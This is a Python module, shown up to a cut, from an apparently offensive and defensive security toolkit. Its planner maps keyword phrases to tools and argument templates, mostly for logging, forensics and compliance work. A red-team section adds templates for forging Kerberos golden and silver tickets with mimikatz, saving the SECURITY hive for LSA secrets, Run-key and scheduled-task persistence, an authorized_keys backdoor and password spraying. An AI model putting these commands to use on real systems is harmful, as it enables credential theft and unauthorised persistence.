# SPDX-License-Identifier: AGPL-3.0-or-later
"""Registry/offline planner — heuristic tool selection without LLM."""

from __future__ import annotations

import logging
import os
import re
from typing import Any

from .events import Event, EventType, emit_sync
from .models import (
    ExecutionPlan,
    PlanStatus,
    PlanStep,
    PlanType,
    StepStatus,
)
from .nlp_engine import NaturalLanguageParser

_IS_WIN = os.name == "nt"

_COMMON_WORDLIST = (
    r"C:\Tools\wordlists\dirb\common.txt" if _IS_WIN else "/usr/share/wordlists/dirb/common.txt"
)
_USERNAME_WORDLIST = (
    r"C:\Tools\wordlists\usernames.txt" if _IS_WIN else "/usr/share/wordlists/usernames.txt"
)
_PASSWORD_WORDLIST = (
    r"C:\Tools\wordlists\passwords.txt" if _IS_WIN else "/usr/share/wordlists/passwords.txt"
)

logger = logging.getLogger(__name__)

TOOL_ALTERNATIVES: dict[str, list[str]] = {
    "nmap": ["masscan", "rustscan", "naabu"],
    "masscan": ["nmap", "rustscan"],
    "gobuster": ["ffuf", "dirb", "dirsearch"],
    "ffuf": ["gobuster", "dirb", "dirsearch"],
    "whatweb": ["wappalyzer", "builtwith"],
    "nuclei": ["nikto", "wapiti", "skipfish"],
    "nikto": ["nuclei", "wapiti"],
    "hydra": ["medusa", "ncrack", "patator"],
    "subfinder": ["amass", "sublist3r", "assetfinder"],
    "amass": ["subfinder", "sublist3r"],
    "curl": ["wget", "httpie"],
    "dig": ["nslookup", "host"],
    "aircrack-ng": ["hashcat", "john"],
    "sqlmap": ["jSQL", "sqlninja"],
    "ping": ["nmap", "fping", "hping3"],
    "winpeas": ["seatbelt", "sharpup", "powerup"],
    "linpeas": ["pspy", "linenum", "linux-exploit-suggester"],
    "crackmapexec": ["netexec", "smbmap"],
    "netexec": ["crackmapexec", "smbmap"],
    "gophish": ["evilginx2", "modlishka"],
    "evilginx2": ["gophish", "modlishka"],
    "binwalk": ["firmwalker", "unblob"],
    "mobsf": ["apktool", "jadx"],
    "frida": ["objection"],
    "objection": ["frida"],
    "chisel": ["ligolo-ng", "socat"],
    "ligolo-ng": ["chisel", "socat"],
    "hashcat": ["john", "john-the-ripper"],
    "john": ["hashcat"],
    "volatility": ["volatility3"],
    "volatility3": ["volatility"],
    "steghide": ["stegcracker", "outguess"],
    "stegcracker": ["steghide"],
    "metasploit": ["msfconsole"],
    "msfconsole": ["metasploit"],
    "rubeus": ["impacket-GetUserSPNs"],
    "mimikatz": ["pypykatz", "lsassy", "nanodump"],
    "pypykatz": ["mimikatz"],
    "certipy": ["certify"],
    "certify": ["certipy"],
    "bettercap": ["ettercap"],
    "ettercap": ["bettercap"],
    "wifite": ["hcxtools", "aircrack-ng"],
    "semgrep": ["bandit", "trivy"],
    "bandit": ["semgrep"],
    "zap-cli": ["nikto"],
    "osquery": ["velociraptor"],
    "velociraptor": ["osquery"],
    "suricata": ["snort"],
    "tshark": ["tcpdump"],
}


# Shared multi-word keyword to tool mappings used by both decompose_goal and _decompose_lightweight
_MULTI_WORD_CHECKS = [
    (
        "ct log",
        "curl",
        "Certificate transparency log search",
        "-s https://crt.sh/?q=%25.{target}&output=json",
    ),
    (
        "ct logs",
        "curl",
        "Certificate transparency log search",
        "-s https://crt.sh/?q=%25.{target}&output=json",
    ),
    ("ssl labs", "ssllabs-scan", "SSL Labs API scanner", ""),
    ("exposed panel", "nuclei", "Exposed panel scan", "-t http/exposed-panels"),
    ("login page", "nuclei", "Exposed login panel scan", "-t http/exposed-panels"),
    ("the harvester", "theHarvester", "Email/subdomain OSINT harvesting", ""),
    # ── Blue Team / Defensive NLP patterns ────────────────────
    ("event log", "wevtutil", "Windows Event Log analysis", "qe Security"),
    ("failed login", "journalctl", "Failed login detection", "-u sshd"),
    ("auth log", "journalctl", "Authentication log analysis", "-u sshd"),
    ("packet capture", "tcpdump", "Network packet capture", "-i eth0 -w capture.pcap"),
    ("memory forensics", "volatility", "Memory forensics analysis", "-f"),
    ("malware analysis", "strings", "Malware static analysis", ""),
    ("reverse engineering", "ghidra", "Reverse engineering", ""),
    ("forensic analysis", "autopsy", "Digital forensic analysis", ""),
    ("incident response", "ps", "Incident response evidence collection", "aux"),
    ("cis benchmark", "lynis", "CIS benchmark audit", "audit system"),
    ("endpoint detection", "osquery", "Endpoint detection query", ""),
    ("threat hunting", "yara", "Threat hunting with YARA", ""),
    ("sigma rule", "sigmac", "Sigma rule creation", ""),
    ("vulnerability scan", "nessus", "Vulnerability scanning", ""),
    ("penetration test", "metasploit", "Penetration testing", ""),
    ("security audit", "lynis", "Security audit", "audit system"),
    ("cloud audit", "prowler", "Cloud security audit", ""),
    ("pcap analysis", "tshark", "PCAP analysis", "-r"),
    ("network forensics", "tshark", "Network forensic analysis", "-r"),
    ("disk image", "sleuthkit", "Disk image analysis", ""),
    ("malware sample", "cape", "Malware sample analysis", ""),
    ("phishing email", "clamav", "Phishing email scan", ""),
    ("ransomware detection", "yara", "Ransomware detection", ""),
    ("forensic evidence", "volatility", "Forensic evidence collection", "-f"),
    ("legal hold", "dd", "Legal hold evidence preservation", ""),
    ("misp threat", "curl", "MISP threat intel query", ""),
    ("ioc in siem", "yara", "IOC-to-SIEM correlation", ""),
    # ── SAST / Code Review patterns ─────────────────────────
    ("code review", "semgrep", "Static code security review", "--config=auto"),
    ("static analysis", "semgrep", "Static code security analysis", "--config=auto"),
    ("source code scan", "semgrep", "Source code security scan", "--config=auto"),
    ("sast scan", "semgrep", "SAST security scan", "--config=auto"),
    ("python security", "bandit", "Python security linting", "-r"),
    ("secrets scan", "gitleaks", "Git secrets scanning", "detect --no-git"),
    ("credential leak", "trufflehog", "Credential leak detection", ""),
    ("hardcoded secrets", "gitleaks", "Hardcoded secrets detection", "detect --no-git"),
    # ── IaC / Cloud patterns ─────────────────────────────────
    ("terraform scan", "checkov", "Terraform security scan", "-d ."),
    ("cloudformation scan", "checkov", "CloudFormation security scan", "-d ."),
    ("iac security", "checkov", "IaC security analysis", "-d ."),
    ("aws audit", "prowler", "AWS security audit", ""),
    ("aws security", "prowler", "AWS security assessment", ""),
    ("cloud compliance", "scoutsuite", "Cloud compliance audit", ""),
    ("k8s audit", "kubectl", "Kubernetes security audit", ""),
    ("kubernetes audit", "kubectl", "Kubernetes security audit", ""),
    # ── Container patterns ───────────────────────────────────
    ("container scan", "trivy", "Container vulnerability scan", "image"),
    ("docker scan", "trivy", "Docker image vulnerability scan", "image"),
    ("image vuln", "trivy", "Container image vulnerability scan", "image"),
    ("sbom generate", "syft", "SBOM generation", ""),
    ("dependency check", "grype", "Dependency vulnerability check", ""),
    # ── Reverse Engineering patterns ─────────────────────────
    ("reverse engineering", "radare2", "Reverse engineering binary analysis", ""),
    ("binary analysis", "radare2", "Binary reverse engineering", ""),
    ("decompile apk", "apktool", "APK decompilation", ""),
    ("android analysis", "apktool", "Android APK analysis", ""),
    # ── OS/System / Syslog patterns ───────────────────────────
    ("check system log", "journalctl", "System log check", ""),
    ("check system logs", "journalctl", "System log check", ""),
    ("audit log analysis", "journalctl", "Log analysis", ""),
    ("parse syslog", "journalctl", "Syslog parsing", ""),
    ("search syslog", "journalctl", "Syslog search", ""),
    ("syslog audit", "journalctl", "Syslog audit", ""),
    ("syslog monitor", "journalctl", "Syslog monitoring", "-f"),
    ("syslog real", "journalctl", "Real-time syslog tail", "-f"),
    ("system log", "journalctl", "System log analysis", ""),
    ("system logs", "journalctl", "System log analysis", ""),
    ("kernel panic", "journalctl", "Kernel panic log", "-k"),
    ("ssh brute force", "journalctl", "SSH brute force detection", "-u sshd"),
    ("ssh authentication", "journalctl", "SSH authentication log", "-u sshd"),
    ("authentication failure", "journalctl", "Authentication failure log", "-u sshd"),
    ("failed authentication", "journalctl", "Failed authentication log", "-u sshd"),
    ("application log", "journalctl", "Application log analysis", "-u"),
    ("cron job audit", "journalctl", "Cron job audit", "-u cron"),
    ("kernel message", "journalctl", "Kernel message check", "-k"),
    ("privilege escalation attempt", "journalctl", "Privilege escalation audit", "-u sshd"),
    ("brute force detection", "journalctl", "Brute force detection", "-u sshd"),
    ("blocked connection", "journalctl", "Blocked connection log", "-u firewall"),
    ("log analysis", "journalctl", "System log analysis", ""),
    # ── Windows Event Log patterns ─────────────────────────────
    ("windows security", "wevtutil", "Windows security log analysis", "qe Security"),
    ("failed password", "wevtutil", "Failed password audit", "qe Security"),
    ("window event", "wevtutil", "Windows Event Log analysis", "qe Security"),
    ("windows event", "wevtutil", "Windows Event Log analysis", "qe Security"),
    ("event id", "wevtutil", "Windows Event ID search", "qe Security"),
    ("process creation", "wevtutil", "Process creation event monitoring", "qe Security"),
    ("account lockout", "wevtutil", "Account lockout event check", "qe Security"),
    ("logon failure", "wevtutil", "Logon failure analysis", "qe Security"),
    ("security event", "wevtutil", "Security event log review", "qe Security"),
    ("user login", "wevtutil", "User login event audit", "qe Security"),
    ("login event", "wevtutil", "Login event analysis", "qe Security"),
    ("event 4624", "wevtutil", "Logon event analysis", "qe Security"),
    ("event 4625", "wevtutil", "Failed logon event analysis", "qe Security"),
    ("event 4688", "wevtutil", "Process creation event analysis", "qe Security"),
    ("event 4732", "wevtutil", "Security group member added", "qe Security"),
    ("event 4720", "wevtutil", "User account creation", "qe Security"),
    ("event log 4625", "wevtutil", "Failed logon event", "qe Security"),
    ("security log", "wevtutil", "Security log analysis", "qe Security"),
    # ── Splunk / SIEM patterns ─────────────────────────────────
    ("query splunk", "curl", "Splunk query execution", ""),
    ("search splunk", "curl", "Splunk search", ""),
    ("splunk alert", "curl", "Splunk alert creation", ""),
    ("splunk correlation rule", "curl", "Splunk correlation rule", ""),
    ("splunk query", "curl", "Splunk query", ""),
    ("splunk search", "curl", "Splunk search", ""),
    ("splunk detection rule", "curl", "Splunk detection rule", ""),
    ("splunk dashboard", "curl", "Splunk dashboard creation", ""),
    ("splunk lookup", "curl", "Splunk lookup table", ""),
    ("splunk saved search", "curl", "Splunk saved search", ""),
    ("splunk index", "curl", "Splunk index search", ""),
    ("splunk report", "curl", "Splunk report creation", ""),
    # ── Azure Sentinel patterns ────────────────────────────────
    ("azure sentinel", "curl", "Azure Sentinel query", ""),
    ("sentinel incident", "curl", "Azure Sentinel incident review", ""),
    ("sentinel alert", "curl", "Azure Sentinel alert rule", ""),
    ("sentinel detection rule", "curl", "Azure Sentinel detection rule", ""),
    ("sentinel analytics", "curl", "Azure Sentinel analytics rule", ""),
    ("sentinel hunting", "curl", "Azure Sentinel hunting query", ""),
    # ── Elasticsearch patterns ─────────────────────────────────
    ("elasticsearch query", "curl", "Elasticsearch query", ""),
    ("elasticsearch search", "curl", "Elasticsearch search", ""),
    ("elastic query", "curl", "Elasticsearch query", ""),
    ("elastic search", "curl", "Elasticsearch search", ""),
    ("elastic index", "curl", "Elasticsearch index search", ""),
    # ── QRadar patterns ────────────────────────────────────────
    ("qradar search", "curl", "QRadar search", ""),
    ("qradar query", "curl", "QRadar query", ""),
    ("qradar offense", "curl", "QRadar offense check", ""),
    ("qradar rule", "curl", "QRadar rule creation", ""),
    # ── VirusTotal / Threat Intel patterns ─────────────────────
    ("virustotal", "curl", "VirusTotal hash lookup", ""),
    ("malware hash", "curl", "Malware hash check", ""),
    ("file hash check", "curl", "File hash threat lookup", ""),
    ("ioc indicator", "curl", "IOC indicator check", ""),
    ("ioc indicators", "curl", "IOC indicator lookup", ""),
    ("threat intel", "curl", "Threat intelligence lookup", ""),
    ("threat intelligence", "curl", "Threat intelligence lookup", ""),
    ("threat feed", "curl", "Threat feed query", ""),
    ("threat report", "curl", "Threat report query", ""),
    ("intelligence feed", "curl", "Threat intelligence feed query", ""),
    ("malicious ip", "curl", "Suspicious IP threat lookup", ""),
    ("suspicious ip", "curl", "Suspicious IP threat lookup", ""),
    ("suspicious domain", "curl", "Suspicious domain check", ""),
    ("domain reputation", "curl", "Domain reputation check", ""),
    ("otx threat", "curl", "OTX threat intelligence query", ""),
    ("alienvault", "curl", "AlienVault OTX query", ""),
    # ── Sigma rules patterns ───────────────────────────────────
    ("sigma conversion", "sigmac", "Sigma rule conversion", ""),
    ("sigma query", "sigmac", "Sigma rule creation", ""),
    ("sigma detection", "sigmac", "Sigma detection rule", ""),
    ("sigma log", "sigmac", "Sigma log source rule", ""),
    ("sigma translate", "sigmac", "Sigma rule translation", ""),
    ("convert sigma", "sigmac", "Sigma rule conversion", ""),
    ("create sigma", "sigmac", "Sigma rule creation", ""),
    ("detection rule", "sigmac", "Detection rule creation", ""),
    # ── YARA rules patterns ────────────────────────────────────
    ("yara rule", "yara", "YARA rule scanning", ""),
    ("yara detection", "yara", "YARA detection rule", ""),
    ("yara scan", "yara", "YARA scan", ""),
    ("yara file", "yara", "YARA file scan", ""),
    ("malware pattern", "yara", "YARA pattern matching", ""),
    # ── Memory / Volatility patterns ───────────────────────────
    ("memory analysis", "volatility", "Memory analysis", "-f"),
    ("memory image", "volatility", "Memory image analysis", "-f"),
    ("memory dump", "volatility", "Memory dump analysis", "-f"),
    ("process hollow", "volatility", "Process hollowing detection", "-f"),
    ("injected code", "volatility", "Code injection detection", "-f"),
    ("ransomware memory", "volatility", "Ransomware memory analysis", "-f"),
    ("process memory", "volatility", "Process memory dump", "-f"),
    ("registry hive from memory", "volatility", "Registry hive extraction", "-f"),
    ("hidden process in memory", "volatility", "Hidden process detection", "-f"),
    ("mimikatz detection", "volatility", "Mimikatz detection in memory", "-f"),
    ("cobalt strike", "volatility", "Cobalt Strike beacon detection", "-f"),
    ("beacon detection", "volatility", "Beacon detection in memory", "-f"),
    # ── Network / PCAP patterns ────────────────────────────────
    ("pcap file", "tshark", "PCAP file analysis", "-r"),
    ("full pcap", "tshark", "Full PCAP analysis", "-r"),
    ("network capture", "tcpdump", "Network traffic capture", "-i eth0 -w capture.pcap"),
    ("live traffic", "tcpdump", "Live traffic monitoring", "-i eth0"),
    ("network traffic", "tcpdump", "Network traffic monitoring", "-i eth0"),
    ("traffic analysis", "tshark", "Traffic analysis", "-r"),
    ("dns query analysis", "tshark", "DNS query analysis", "-Y dns -r"),
    ("dns tunneling", "tshark", "DNS tunneling analysis", "-r"),
    ("dns exfiltrat", "tshark", "DNS exfiltration detection", "-Y dns -r"),
    ("data exfiltrat", "tshark", "Data exfiltration detection", "-r"),
    ("ssl tls handshake", "tshark", "SSL/TLS handshake analysis", "-Y ssl.handshake -r"),
    ("tcp stream", "tshark", "TCP stream analysis", "-z follow,tcp,ascii"),
    ("ip conversation", "tshark", "IP conversation analysis", "-z conv,ip"),
    ("http object", "tshark", "HTTP object extraction", "--export-objects http,"),
    ("smb traffic", "tshark", "SMB traffic analysis", "-Y smb -r"),
    ("arp poisoning", "tcpdump", "ARP poisoning detection", "-i eth0 arp"),
    ("rogue dhcp", "tcpdump", "Rogue DHCP detection", "-i eth0 port 67"),
    ("netflow", "tshark", "NetFlow analysis", "-r"),
    ("suspicious connection", "tshark", "Suspicious connection analysis", "-r"),
    # ── Malware / Binary Analysis patterns ─────────────────────
    ("malware sample", "strings", "Malware sample analysis", ""),
    ("suspicious binary", "strings", "Suspicious binary analysis", ""),
    ("ransomware note", "strings", "Ransom note analysis", ""),
    ("ransom note", "strings", "Ransom note analysis", ""),
    ("email attachment", "strings", "Email attachment analysis", ""),
    ("office macro", "strings", "Office macro analysis", ""),
    ("vba code", "strings", "VBA code analysis", ""),
    ("embedded url", "strings", "Embedded URL extraction", ""),
    ("hardcoded credential", "strings", "Hardcoded credential extraction", ""),
    ("config data", "strings", "Malware config extraction", ""),
    ("malware family", "strings", "Malware family identification", ""),
    ("pe file", "pestudio", "PE file analysis", ""),
    ("pe structure", "pestudio", "PE structure analysis", ""),
    ("malicious indicator", "pestudio", "Malicious indicator scan", ""),
    ("malicious dll", "objdump", "Malicious DLL analysis", ""),
    ("elf binary", "objdump", "ELF binary analysis", "-d"),
    ("api call analysis", "objdump", "API call analysis", ""),
    ("import address", "objdump", "Import address table analysis", "-x"),
    ("binary analysis", "objdump", "Binary code analysis", "-d"),
    ("export function", "objdump", "DLL export analysis", "-x"),
    # ── Reverse Engineering patterns ───────────────────────────
    ("control flow", "ghidra", "Control flow analysis", ""),
    ("c2 protocol", "ghidra", "C2 protocol reverse engineering", ""),
    ("encryption routine", "ghidra", "Encryption routine analysis", ""),
    (".net decompil", "ghidra", ".NET decompilation", ""),
    ("memory section", "radare2", "Memory section analysis", ""),
    ("anti-debug", "radare2", "Anti-debugging analysis", ""),
    ("packed binary", "radare2", "Packed binary analysis", ""),
    ("obfuscated algorithm", "radare2", "Algorithm deobfuscation", ""),
    ("suspicious function", "radare2", "Suspicious function analysis", ""),
    # ── Incident Response patterns ─────────────────────────────
    ("incident response", "ps", "incident response evidence collection", "aux"),
    ("live system", "ps", "Live system evidence collection", "aux"),
    ("system information", "ps", "System information collection", "aux"),
    ("timeline reconstruction", "ps", "Incident timeline reconstruction", "aux"),
    ("suspicious process", "ps", "Suspicious process analysis", "aux"),
    ("active connection", "netstat", "Active connection analysis", "-ano"),
    ("network connection", "netstat", "List network connections", "-ano"),
    ("network exposure", "netstat", "Network exposure audit", "-ano"),
    ("listening port", "netstat", "Listening port audit", "-ano"),
    ("running process", "ps", "Running process check", "aux"),
    # ── Forensics / Disk patterns ──────────────────────────────
    ("disk forensics", "sleuthkit", "Disk forensic analysis", ""),
    ("forensic analysis", "sleuthkit", "Digital forensic analysis", ""),
    ("disk analysis", "sleuthkit", "Disk forensic analysis", ""),
    ("deleted file", "sleuthkit", "Deleted file recovery", ""),
    ("file system metadata", "sleuthkit", "File system metadata analysis", ""),
    ("partition table", "sleuthkit", "Partition analysis", ""),
    ("unallocated space", "sleuthkit", "Unallocated space analysis", ""),
    ("slack space", "sleuthkit", "Slack space analysis", ""),
    ("chrome history", "sleuthkit", "Browser history extraction", ""),
    ("browser history", "sleuthkit", "Browser forensics", ""),
    ("email artifact", "sleuthkit", "Email artifact extraction", ""),
    ("prefetch file", "sleuthkit", "Prefetch file analysis", ""),
    ("memory acquisition", "dd", "Memory acquisition", "if=/proc/kcore"),
    ("forensic imaging", "dd", "Forensic disk imaging", "if=/dev/sda"),
    ("forensic disk", "dd", "Forensic disk imaging", "if=/dev/sda"),
    ("capture memory", "dd", "Memory acquisition", "if=/proc/kcore"),
    ("preserve evidence", "wevtutil", "Evidence preservation", "qe Security"),
    # ── System Hardening / CIS patterns ────────────────────────
    ("hardening audit", "lynis", "System hardening audit", "audit system"),
    ("security baseline", "lynis", "Security baseline check", "audit system"),
    ("lynis audit", "lynis", "System audit via Lynis", "audit system"),
    ("openscap scan", "openscap", "OpenSCAP compliance scan", "oval eval"),
    ("compliance scan", "openscap", "Compliance scan", "oval eval"),
    ("oval scan", "openscap", "OVAL compliance scan", "oval eval"),
    ("soc2", "openscap", "SOC2 compliance scan", "oval eval"),
    ("pci dss", "openscap", "PCI DSS compliance scan", "oval eval"),
    ("hipaa", "openscap", "HIPAA compliance scan", "oval eval"),
    ("gdpr", "openscap", "GDPR compliance scan", "oval eval"),
    ("nist 800", "openscap", "NIST 800-53 compliance scan", "oval eval"),
    ("sox compliance", "net", "SOX compliance audit", "user"),
    ("iso 27001", "openscap", "ISO 27001 compliance scan", "oval eval"),
    ("access control audit", "openscap", "Access control audit", "oval eval"),
    ("logging mechanism audit", "openscap", "Logging mechanism audit", "oval eval"),
    # ── File Integrity / Detection patterns ────────────────────
    ("file integrity", "aide", "File integrity check", "--check"),
    ("aide check", "aide", "File integrity via AIDE", "--check"),
    ("tripwire check", "tripwire", "Tripwire integrity check", "--check"),
    ("unauthorized change", "aide", "Unauthorized change detection", "--check"),
    ("rollback change", "aide", "File change rollback", "--check"),
    ("rootkit detection", "chkrootkit", "Rootkit detection scan", "-q"),
    ("chkrootkit scan", "chkrootkit", "Rootkit scan via chkrootkit", "-q"),
    ("rkhunter check", "rkhunter", "Rootkit check via rkhunter", "--check"),
    ("kernel module check", "lsmod", "Kernel module audit", ""),
    ("loadable kernel", "lsmod", "Loadable kernel module check", ""),
    # ── Endpoint Detection patterns ────────────────────────────
    ("osquery query", "osquery", "Endpoint query via osquery", ""),
    ("osquery scan", "osquery", "Endpoint scan via osquery", ""),
    ("antivirus scan", "clamav", "Antivirus scan", ""),
    ("clamav scan", "clamav", "ClamAV scan", ""),
    ("malware scan", "clamav", "Malware scan", ""),
    ("viru scan", "clamav", "Virus scan", ""),
    # ── Disk Encryption patterns ───────────────────────────────
    ("disk encryption", "cryptsetup", "Disk encryption verification", "luksStatus"),
    ("luks check", "cryptsetup", "LUKS encryption status", "luksStatus"),
    ("encryption check", "cryptsetup", "Encryption verification", "luksStatus"),
    ("backup encrypted", "cryptsetup", "Backup encryption check", "luksStatus"),
    # ── Cloud Security patterns ────────────────────────────────
    ("cloud security", "prowler", "Cloud security audit", ""),
    ("prowler scan", "prowler", "Cloud audit via Prowler", ""),
    ("aws security", "prowler", "AWS security audit", ""),
    # ── Windows AD / Service patterns ──────────────────────────
    ("password policy", "net", "Password policy audit", "accounts"),
    ("domain controller audit", "net", "Domain controller audit", 'group "Domain Controllers"'),
    ("ad domain", "net", "AD domain audit", "user /domain"),
    ("domain admin group", "net", "Domain admin group audit", 'group "Domain Admins"'),
    ("service account", "net", "Service account review", "user /domain"),
    ("password never expires", "net", "Password expiry audit", "user"),
    ("stale user account", "net", "Stale account audit", "user"),
    ("user right audit", "secedit", "User rights assignment", ""),
    ("windows service", "sc", "Windows service audit", "query"),
    ("suspicious driver", "sc", "Suspicious driver check", "query"),
    ("scheduled task", "schtasks", "Scheduled task audit", ""),
    # ── Honeypot patterns ──────────────────────────────────────
    ("deploy honeypot", "cat", "Honeypot deployment", ""),
    ("honeypot deployment", "cat", "Honeypot deployment", ""),
    ("cowrie honeypot", "cat", "Cowrie SSH honeypot", ""),
    ("cowrie ssh", "cat", "Cowrie SSH honeypot", ""),
    ("web honeypot", "cat", "Web application honeypot", ""),
    ("honey file", "cat", "Honey file monitoring", ""),
    ("monitor honeypot", "cat", "Honeypot log monitoring", ""),
    ("honeypot log", "cat", "Honeypot log analysis", ""),
    # ── Backup / DR patterns ───────────────────────────────────
    ("backup verification", "cat", "Backup verification", ""),
    ("backup integrity", "cat", "Backup integrity check", ""),
    ("backup replication", "cat", "Backup replication check", ""),
    ("backup retention", "cat", "Backup retention check", ""),
    ("backup log", "cat", "Backup log check", ""),
    ("verify backup", "cat", "Backup verification", ""),
    ("verify logging", "cat", "Logging configuration check", ""),
    # ── Database Security patterns ─────────────────────────────
    ("database security", "cat", "Database security audit", ""),
    ("database user", "cat", "Database user audit", ""),
    ("database permission", "cat", "Database permission review", ""),
    ("database audit log", "cat", "Database audit log analysis", ""),
    # ── Patch Management patterns ──────────────────────────────
    ("patch compliance", "nuclei", "Patch compliance audit", ""),
    ("patch deployment", "nuclei", "Patch deployment verification", ""),
    ("missing patch", "nuclei", "Missing security patch scan", ""),
    ("unpatched vulnerability", "nuclei", "Unpatched vulnerability scan", ""),
    ("deployment status", "nuclei", "Deployment status check", ""),
    ("reboot status", "cat", "Reboot status check", ""),
    ("kernel version", "cat", "Kernel version check", ""),
    # ── Container Security patterns ────────────────────────────
    ("container security", "curl", "Container security audit", ""),
    ("docker image", "curl", "Docker image vulnerability scan", ""),
    ("docker daemon", "cat", "Docker daemon security audit", ""),
    ("kubernetes rbac", "curl", "Kubernetes RBAC audit", ""),
    ("pod security", "curl", "Pod security standard audit", ""),
    ("container runtime", "cat", "Container runtime security audit", ""),
    # ── Network Security patterns ──────────────────────────────
    ("firewall rule", "iptables", "Firewall rule check", "-L -n -v"),
    ("block outbound", "iptables", "Block outbound traffic", "-A OUTPUT -j DROP"),
    ("block malicious", "iptables", "Block malicious IP", "-A INPUT -s"),
    ("isolate host", "iptables", "Host isolation", "-A INPUT -j DROP"),
    ("quarantine host", "iptables", "Host quarantine", "-A INPUT -j DROP"),
    ("disable account", "net", "Disable user account", "user"),
    ("disable compromised", "net", "Disable compromised account", "user"),
    # ── Additional catch-all patterns ──────────────────────────
    ("verify certificate", "openssl", "Certificate verification", "x509"),
    ("failover procedure", "cat", "Disaster recovery failover test", ""),
    ("bare metal restore", "cat", "Bare metal restore test", ""),
    ("secure boot", "cat", "Secure boot verification", ""),
    ("tpm configuration", "cat", "TPM configuration check", ""),
    ("sudoers audit", "cat", "Sudoers audit", ""),
    ("sql injection detection", "cat", "SQL injection log check", ""),
    ("connection string", "cat", "Connection string review", ""),
    ("embedded domain", "strings", "Embedded domain extraction", ""),
    ("network blocking", "iptables", "Network blocking from IOCs", ""),
    # ── MISP / Threat Platform patterns ────────────────────────
    ("misp query", "curl", "MISP query", ""),
    ("misp event", "curl", "MISP event lookup", ""),
    ("misp ioc", "curl", "MISP IOC lookup", ""),
    ("misp feed", "curl", "MISP feed check", ""),
    ("threat intel platform", "curl", "Threat intelligence platform query", ""),
    ("triage collection", "volatility", "Triage collection", "-f"),
    ("compromised host", "volatility", "Compromised host analysis", "-f"),
    # ── Original red team multi-word patterns ─────────────────
    ("gpp password", "nmap", "GPP password check in SYSVOL", "--script smb-enum-gpp -p 445"),
    ("gpp passwords", "nmap", "GPP password check in SYSVOL", "--script smb-enum-gpp -p 445"),
    ("domain trust", "nmap", "Domain trust enumeration", "--script smb-enum-domains -p 445"),
    ("domain trusts", "nmap", "Domain trust enumeration", "--script smb-enum-domains -p 445"),
    ("sid history", "nmap", "SID history enumeration", "--script smb-enum-sessions -p 445"),
    ("lsa secret", "reg", "Extract LSA secrets from registry", "save HKLM\\SECURITY"),
    ("lsa secrets", "reg", "Extract LSA secrets from registry", "save HKLM\\SECURITY"),
    ("password spray", "hydra", "Password spraying attack", ""),
    ("password spraying", "hydra", "Password spraying attack", ""),
    ("owa password", "hydra", "OWA password spraying", ""),
    ("wmi connection", "impacket-wmiexec", "WMI remote execution", ""),
    ("reverse tunnel", "chisel", "Reverse tunnel setup", "client"),
    ("ssh tunnel", "ssh", "SSH tunnel setup", "-R"),
    ("scheduled task", "schtasks", "Create scheduled task", "/create /tn updater /tr"),
    ("golden ticket", "mimikatz", "Forge golden ticket", "kerberos::golden"),
    ("silver ticket", "mimikatz", "Forge silver ticket", "kerberos::silver"),
    ("cross-forest", "nmap", "Cross-forest trust enumeration", "--script smb-enum-domains -p 445"),
    ("cross forest", "nmap", "Cross-forest trust enumeration", "--script smb-enum-domains -p 445"),
    ("proxy chain", "proxychains", "Proxy chain setup", ""),
    ("domain fronting", "nginx", "Domain fronting setup", ""),
    ("suid binary", "find", "SUID binary discovery", "/ -perm -4000 -type f 2>/dev/null"),
    ("suid binaries", "find", "SUID binary discovery", "/ -perm -4000 -type f 2>/dev/null"),
    ("world writable", "find", "World-writable file search", "/ -writable -type d 2>/dev/null"),
    ("world-writable", "find", "World-writable file search", "/ -writable -type d 2>/dev/null"),
    ("cron job", "cat", "Cron job inspection", ""),
    ("cron jobs", "cat", "Cron job inspection", ""),
    ("cron path", "cat", "Cron path inspection", ""),
    ("cron paths", "cat", "Cron path inspection", ""),
    ("authorized key", "ssh", "SSH authorized_keys backdoor", ""),
    ("authorized_keys", "ssh", "SSH authorized_keys backdoor", ""),
    ("systemd service", "systemctl", "Manage systemd service", ""),
    (
        "registry run",
        "reg",
        "Add registry Run key",
        "add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    ),
    ("privilege escalation", "cat", "Privilege escalation audit", ""),
    ("default password", "crackmapexec", "Default password check", ""),
    ("email security", "dig", "Email security configuration audit", ""),
    ("content discovery", "gobuster", "Web content discovery", "dir -w " + _COMMON_WORDLIST),
    ("mass port", "masscan", "Mass port scanner", ""),
    ("ad user", "nmap", "AD user enumeration", "--script ldap-search -p 389"),
    ("ad users", "nmap", "AD user enumeration", "--script ldap-search -p 389"),
    ("full ad assessment", "nmap", "Full AD security assessment", "--script ldap-search -p 389"),
    # ── Additional patterns to cover blue team test goals ───────
    ("monitor syslog", "journalctl", "Real-time syslog monitoring", "-f"),
    ("search elastic", "curl", "Elasticsearch search", ""),
    ("dmz traffic", "tcpdump", "DMZ traffic capture", "-i eth0 -w capture.pcap"),
    ("dmz interface", "tcpdump", "DMZ interface packet capture", "-i eth0 -w capture.pcap"),
    ("on the dmz", "tcpdump", "DMZ network capture", "-i eth0 -w capture.pcap"),
    ("windows registry", "reg", "Windows registry query", "query"),
    ("forensic triage", "volatility", "Forensic triage collection", "-f"),
    ("block all outbound", "iptables", "Block all outbound traffic", "-A OUTPUT -j DROP"),
    ("static analysis", "strings", "Static analysis of binary", ""),
    ("sandbox analysis", "cape", "Sandbox analysis", ""),
    ("sandbox environment", "cape", "Sandbox environment analysis", ""),
    ("through the sandbox", "cape", "Sandbox execution analysis", ""),
    ("lsass dump", "volatility", "LSASS dump detection", "-f"),
    ("soc 2", "openscap", "SOC 2 compliance scan", "oval eval"),
    ("database backup", "cat", "Database backup verification", ""),
    ("disaster recovery plan", "cat", "Disaster recovery validation", ""),
    ("failover test", "cat", "Failover test", ""),
    ("canary token", "cat", "Canary token deployment", ""),
    ("database backup encryption", "cryptsetup", "Database backup encryption check", "luksStatus"),
    # ── Common utility patterns ───────────────────────────────────
    ("check if server", "ping", "ICMP connectivity check", "-c 4"),
    ("is server up", "ping", "ICMP connectivity check", "-c 4"),
    ("server up", "ping", "ICMP connectivity check", "-c 4"),
    ("server alive", "ping", "ICMP connectivity check", "-c 4"),
    ("connectivity test", "ping", "ICMP connectivity check", "-c 4"),
    ("check connectivity", "ping", "ICMP connectivity check", "-c 4"),
    (
        "what is my ip",
        "dig",
        "Public IP address lookup",
        "TXT +short o-o.myaddr.l.google.com @ns1.google.com",
    ),
    (
        "my public ip",
        "dig",
        "Public IP address lookup",
        "TXT +short o-o.myaddr.l.google.com @ns1.google.com",
    ),
    (
        "my ip address",
        "dig",
        "Public IP address lookup",
